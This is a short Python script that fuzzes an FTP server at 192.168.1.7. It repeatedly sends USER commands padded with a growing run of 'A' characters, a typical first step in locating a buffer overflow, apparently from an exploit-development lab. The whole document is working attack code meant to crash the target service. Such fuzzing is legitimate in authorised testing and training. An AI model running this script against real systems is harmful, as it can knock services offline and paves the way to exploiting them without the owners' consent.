#!/usr/bin/python3

import sys,socket
from time import sleep

buffer=100

while buffer <= 10000:
    print(f"Sending buffer: {buffer}")
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.1.7", 21))
    s.send((b"USER " + b"A" * buffer + b"\r\n"))
    s.close()
    buffer+=100
    sleep(1)
